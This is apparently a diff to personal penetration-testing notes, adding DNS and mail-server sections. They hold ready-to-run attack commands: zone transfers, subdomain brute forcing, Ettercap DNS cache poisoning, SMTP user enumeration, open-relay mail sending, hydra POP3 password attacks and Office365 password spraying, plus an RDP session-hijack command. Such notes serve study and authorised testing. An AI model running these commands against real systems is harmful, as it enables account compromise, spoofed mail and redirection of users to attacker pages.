@@ -8,7 +8,7 @@ Navigation: [[Pentesting]]
 4. MSSQL
 5. RDP
 6. DNS
-7. SMTP
+7. Mail Servers
 # FTP
 ### Enumeration
 **Local Config**
@@ -337,10 +337,158 @@ sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>"
 
 net start sessionhijack
 ```
-
 # DNS
+**Nmap**
+```shell
+nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP>
+```
 
-# SMTP
+Here's a map of DNS domains:
+![[DNS Image.png]]
+
+**Types of DNS Servers**
+
+| **Server Type**   | **Description**                                                                                                                                                                           |
+| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Root              | Top of hierarchy, manages top level domains and only steps in if lower-level servers don't respond. Managed by Internet Corporation for Assigned Names and Numbers, only 13 in the world. |
+| Authoritative     | Have the final say for queries in designated zones, offering definitive answers. If they can't answer, root server steps in.                                                              |
+| Non-authoritative | Lacks ownership over DNS zones, gathers domain information through queries to other servers.                                                                                              |
+| Caching           | Caches previous queries to speed up response times for future requests. Cache time dictated by authoritative server.                                                                      |
+| Forwarding        | Forwards relay queries to other servers.                                                                                                                                                  |
+| Resolver          | Integrated within hosts or routers. Execute name resolution locally and aren't authoritative.                                                                                             |
+**Record Types**
+
+
+| **Record** | **Description**                                                                                       |
+| ---------- | ----------------------------------------------------------------------------------------------------- |
+| `A`        | IPv4 address of a domain.                                                                             |
+| `AAAA`     | IPv6 address of a domain.                                                                             |
+| `MX`       | Responsible mail servers.                                                                             |
+| `NS`       | DNS servers of domain.                                                                                |
+| `TXT`      | Used as a wildcard for information. Commonly used to validate SSL certificates and for DMARC entries. |
+| `CNAME`    | Contains aliases for `A` record of a domain.                                                          |
+| `PTR`      | Used for reverse lookup, converts IP address to domain name.                                          |
+| `SOA`      | Information for DNS zone and email address of administrative contact.                                 |
+
+**Querying Domain Information**
+```shell
+dig any victim.com @<DNS_IP>
+```
+
+**Zone Transfers**
+This attack is used to gain information about a DNS zone record, which can contain info about subdomains, IP addresses, and other network resources.
+```shell
+dig axfr @<DNS_IP> #Try zone transfer without domain
+dig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain
+fierce --domain <DOMAIN> --dns-servers <DNS_IP> #Will try to perform a zone transfer against every authoritative name server and if this doesn't work, will launch a dictionary attack
+```
+
+**More Information**
+```shell
+dig ANY @<DNS_IP> <DOMAIN>     #Any information
+dig A @<DNS_IP> <DOMAIN>       #Regular DNS request
+dig AAAA @<DNS_IP> <DOMAIN>    #IPv6 DNS request
+dig TXT @<DNS_IP> <DOMAIN>     #Information
+dig MX @<DNS_IP> <DOMAIN>      #Emails related
+dig NS @<DNS_IP> <DOMAIN>      #DNS that resolves that name
+dig -x 192.168.0.2 @<DNS_IP>   #Reverse lookup
+dig -x 2a00:1450:400c:c06::93 @<DNS_IP> #reverse IPv6 lookup
+
+#Use [-p PORT]  or  -6 (to use ivp6 address of dns)
+```
+
+**Domain Takeover**
+This attack involved registering a non-existent domain name to gain control over another domain. It's also possible with subdomains, known as subdomain takeover.
+
+Here's how we can find subdomains using [`Subfinder`](https://github.com/projectdiscovery/subfinder):
+```shell
+./subfinder -d <domain> -v
+```
+
+We can also use [`subbrute`](https://github.com/TheRook/subbrute) if we don't have internet access:
+```shell 
+git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+cd subbrute
+echo "<DNS Server>" > ./resolvers.txt
+./subbrute <"domain"> -s ./names.txt -r ./resolvers.txt
+```
+
+**DNS Cache Poisoning**
+We can perform DNS Cache poisoning using MITM tools like [`Ettercap`](https://www.ettercap-project.org/) or [`Bettercap`](https://www.bettercap.org/).
+
+First we'll need to edit `/etc/ettercap/etter.dns`:
+```shell
+<target domain>  A  <attacker IP>
+```
+
+Next start `Ettercap` and go to `Hosts` -> `Scan for Hosts`. Then add the target IP to `target1`, set the default gateway IP as `target2`.
+
+Then we can activate the attack by going to `Plugins` -> `Manage Plgugins`. If successful, this attack will redirect users attempting to visit the domain to a fake page that we control. Additionally, pinging the domain should ping our IP as well.
+# Mail Servers
+### SMTP
+**Nmap**
+```shell
+nmap -p25 --script smtp-commands <IP>
+nmap -p25 --script smtp-open-relay <IP> -v
+nmap --script smtp-enum-users <IP>
+```
+
+**Connect to the Service**
+```shell
+telnet <IP> 25
+```
+
+**Checking User Validity**
+```shell
+VRFY <user> # will return whether or not a user is valid
+EXPN <user or list> # similar to VRFY  but can list users
+```
+
+**Username Brute Force**
+```shell
+smtp-user-enum -M RCPT -U userlist.txt -D <email domain> -t <IP>
+```
+
+**Open Relay**
+Allows mail from any source to be re-routed through the open relay server. Masks the source of messages and makes it look like it came from open relay server.
+
+The `nmap` script above checks for open relay. If it's allowed, here's how we can send mail:
+```shell
+swaks --from <sender> --to <recipient> --header 'Subject: <subject>' --body '<message>' --server <IP>
+```
+
+### POP3
+**Connecting to the Server**
+```shell
+telnet 10.10.110.20 110
+```
+
+**Checking User Validity**
+```shell
+USER <username>
+```
+
+**Password Attack**
+```shell
+hydra -L users.txt -p '<password>' -f <IP> pop3 # also works for other email servers
+```
+### Office365
+This all uses [`O365Spray`](https://github.com/0xZDH/o365spray)
+
+**Checking Server Validity**
+```shell
+python3 o365spray.py --validate --domain <target domain>
+```
+
+**Username Spray**
+```shell
+o365spray.py --enum -U users.txt --domain <target domain>
+```
+
+**Password Spray**
+```shell
+python3 o365spray.py --spray -U <users list> -p <password> --count 1 --lockout 1 --domain <target domain>
+```
 
 ---
 Navigation: [[Pentesting]]
